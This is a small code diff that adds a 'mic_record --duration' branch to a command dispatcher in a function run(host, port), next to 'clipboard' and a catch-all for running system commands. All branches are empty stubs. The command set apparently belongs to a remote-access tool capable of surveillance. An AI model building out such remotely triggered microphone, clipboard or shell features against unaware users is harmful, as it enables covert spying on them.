@@ -38,6 +38,8 @@ def run(host, port):
                 pass
             elif command == "clipboard":
                 pass
+            elif command[:21] == "mic_record --duration":
+                pass
             else: # * Run Other System Commands
                 pass
     except:
